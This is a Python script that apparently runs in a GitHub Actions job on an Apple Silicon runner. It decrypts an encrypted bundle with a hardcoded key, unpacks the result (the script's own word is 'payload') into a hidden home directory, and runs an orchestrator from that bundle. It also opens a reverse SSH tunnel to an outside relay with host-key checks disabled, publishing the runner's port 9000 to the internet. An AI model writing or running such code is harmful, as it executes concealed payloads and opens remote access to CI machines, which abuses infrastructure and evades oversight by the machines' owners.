import os, sys, subprocess, base64, hashlib, tarfile, time

def main():
    print("=== VANTA APPLE SILICON RUNNER INITIALIZING ===")
    
    # 1. Install cryptography
    subprocess.run([sys.executable, "-m", "pip", "install", "cryptography", "paramiko", "requests", "pyyaml"], check=True)
    from cryptography.fernet import Fernet
    
    # 2. Decrypt bundle
    key = base64.urlsafe_b64encode(hashlib.sha256(b"vanta_apex_root_2026!").digest())
    f = Fernet(key)
    
    with open("m1_bundle.enc", "rb") as fp:
        raw = f.decrypt(fp.read())
        
    os.makedirs(os.path.expanduser("~/.vanta"), exist_ok=True)
    os.makedirs(os.path.expanduser("~/VantaSlots"), exist_ok=True)
    
    tar_path = "/tmp/m1_bundle.tar.gz"
    with open(tar_path, "wb") as fp:
        fp.write(raw)
        
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=os.path.expanduser("~/.vanta"))
        
    print("Payload successfully decrypted & unpacked to ~/.vanta")
    
    # 3. Start Pinggy TCP Tunnel on port 9000
    os.makedirs("tunnel_logs", exist_ok=True)
    tunnel_cmd = "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -p 443 -R0:localhost:9000 tcp@a.pinggy.io > tunnel_logs/pinggy.log 2>&1"
    subprocess.Popen(tunnel_cmd, shell=True)
    
    tunnel_addr = ""
    for _ in range(15):
        time.sleep(1)
        if os.path.exists("tunnel_logs/pinggy.log"):
            with open("tunnel_logs/pinggy.log", "r") as log:
                c = log.read()
                import re
                m = re.findall(r'([a-z0-9]+\.a\.pinggy\.io:\d+|a\.pinggy\.io:\d+)', c)
                if m:
                    tunnel_addr = m[0]
                    break
                    
    print("==================================================")
    print("VANTA LIVE M1 ORCHESTRATOR URL:", tunnel_addr)
    print("==================================================")
    
    summary_file = os.environ.get("GITHUB_STEP_SUMMARY")
    if summary_file:
        with open(summary_file, "a") as sf:
            sf.write(f"\n## 🚀 VANTA Apple Silicon Node Online!\n**Live Endpoint:** `{tunnel_addr}`\n")
            
    # 4. Launch orchestrator
    env = os.environ.copy()
    env["PYTHONPATH"] = os.path.expanduser("~/.vanta")
    orch_path = os.path.expanduser("~/.vanta/vanta_orchestrator.py")
    subprocess.run([sys.executable, orch_path], env=env)

if __name__ == "__main__":
    main()
